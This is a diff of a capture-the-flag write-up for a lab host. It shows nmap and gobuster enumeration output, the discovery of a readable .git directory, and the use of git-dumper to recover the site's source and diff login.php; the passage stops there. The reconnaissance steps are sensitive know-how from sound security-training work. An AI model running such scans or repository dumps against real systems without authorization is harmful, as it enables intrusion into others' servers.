@@ -1,5 +1,11 @@
+# CTF 04
+```bash
+IP=192.168.10.17
+```
+
+## nmap 
 ````bash
-$ nmap -sV -Pn -p- -A 192.168.10.17
+$ nmap -sV -Pn -p- -A $IP
 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-14 06:40 EDT
 Nmap scan report for 192.168.10.17
 Host is up (0.0043s latency).
@@ -27,11 +33,52 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 332.80 seconds
 ````
+
+## gobuster
+
+```bash
+
+$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt                                           
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.10.17
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/06/15 10:49:30 Starting gobuster in directory enumeration mode
+===============================================================
+/.hta                 (Status: 403) [Size: 278]
+/.git/HEAD            (Status: 200) [Size: 23] 
+/.htpasswd            (Status: 403) [Size: 278]
+/.htaccess            (Status: 403) [Size: 278]
+/config               (Status: 301) [Size: 315] [--> http://192.168.10.17/config/]
+/index.php            (Status: 200) [Size: 740]                                   
+/js                   (Status: 301) [Size: 311] [--> http://192.168.10.17/js/]    
+/server-status        (Status: 403) [Size: 278]                                   
+/style                (Status: 301) [Size: 314] [--> http://192.168.10.17/style/] 
+                                                                                  
+===============================================================
+2022/06/15 10:49:33 Finished
+===============================================================
+
+```
+
+
 .git was readable so we look for the commits done
 we see that one of them is about the security in the login.php 
-So we used the git-dump to see the content on that pull 
-https://github.com/arthaud/git-dumper
+So we used the [git-dump](https://github.com/arthaud/git-dumper) to see the content on that pull 
+
+
 ````bash
+$ pip install git-dumper
+$ mkdir website
+$ ./git_dumper.py http://$IP/.git/ ./website
 $ git diff a4d900a8d85e8938d3601f3cef113ee293028e10
 index 8a0ff67..0904b19 100644
 --- a/login.php
@@ -48,9 +95,6 @@ index 8a0ff67..0904b19 100644
          $_SESSION['userid'] = 1;
          header("location:dashboard.php");
          die();
-
-$ pip install git-dumper
-$ ./git_dumper.py http://192.168.10.17/.git/ ~/website
 
 ````
 Now the content is in /website 
